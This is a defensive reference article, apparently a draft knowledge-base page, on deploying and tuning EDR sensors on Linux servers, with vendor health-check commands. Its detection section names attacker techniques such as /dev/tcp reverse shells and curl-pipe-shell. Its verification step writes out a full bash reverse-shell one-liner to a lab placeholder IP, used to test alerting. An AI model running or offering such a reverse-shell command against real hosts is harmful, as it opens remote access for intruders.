---
id: computing-software.cybersecurity-defensive.endpoint-security.linux-server-edr
name: linux-server-edr
category: computing-software
field: cybersecurity-defensive
product: endpoint-security
tags: [edr, linux-edr, ebpf-sensor, mde-linux, crowdstrike-linux, kernel-compatibility, performance-tuning, container-hosts]
level: advanced
status: draft
description: "Run EDR on Linux servers: eBPF vs kernel-module sensors, kernel compatibility, performance and exclusions for databases and build hosts, container visibility, and health checks."
sources: ["https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-endpoint-linux", "https://learn.microsoft.com/en-us/defender-endpoint/linux-support-perf", "https://www.elastic.co/guide/en/security/current/install-endpoint.html"]
licence: Apache-2.0
version: 2
updated: 2026-11-17
---

# EDR on Linux servers

Linux hosts run the crown jewels (databases, web tiers, Kubernetes nodes) and are often the least
monitored. EDR there differs from Windows.

## Sensor types
- **eBPF-based** (modern default for MDE, CrowdStrike "user mode", Elastic Defend, SentinelOne): no
  kernel module, broad kernel support (4.x/5.x with BTF), fewer upgrade breakages.
- **Kernel module / auditd-based** (older): needs matching kernel versions; kernel updates can leave
  the sensor in reduced functionality mode until the vendor supports the new kernel.
Check vendor support matrices before kernel upgrades; alert on sensors in RFM/degraded mode.

## Deployment
- Package repos plus config management (Ansible/Puppet/Salt) or golden images; onboarding scripts/
  tokens stored as secrets.
- MDE: `mdatp health` (`healthy`, `real_time_protection_enabled`, `edr_machine_id`), `mdatp connectivity test`.
- CrowdStrike: `falconctl -g --rfm-state`, `--aid`; Elastic: `elastic-endpoint status`.

## Performance and exclusions
- High-I/O workloads (databases, build servers, log shippers) can see CPU overhead from real-time
  file scanning. Profile first (MDE: `mdatp diagnostic real-time-protection-statistics --output json`
  shows top scanned processes).
- Exclude narrowly: data directories of the database (not the binaries), with process+path scope where
  supported. Never exclude `/tmp`, `/dev/shm` or interpreters.
- Prefer EDR-only (behavioural) mode with AV scanning off on very sensitive hosts rather than wide exclusions.

## Containers and Kubernetes
Host sensors see container processes (with container ID/namespace metadata if supported). For
managed node pools, use the vendor's DaemonSet. Distroless images still show process execution at
the host level.

## Detection value on Linux
Reverse shells (bash -i, /dev/tcp), web server processes spawning shells, crontab/systemd persistence,
new SSH authorized_keys, LD_PRELOAD, kernel module loads, cryptominer behaviour, `curl | sh`.

## Gotchas
- SELinux/AppArmor can block sensor components; use vendor policies.
- Immutable OSes (Bottlerocket, Flatcar, CoreOS) need DaemonSet or vendor-specific install.
- Hosts without outbound internet need proxy settings; sensors silently stop reporting otherwise.

## Verify
Fleet report: all Linux servers onboarded, healthy, not in degraded mode; a test reverse-shell command
(`bash -c 'bash -i >& /dev/tcp/<lab-ip>/4444 0>&1'` in a lab) generates an alert.
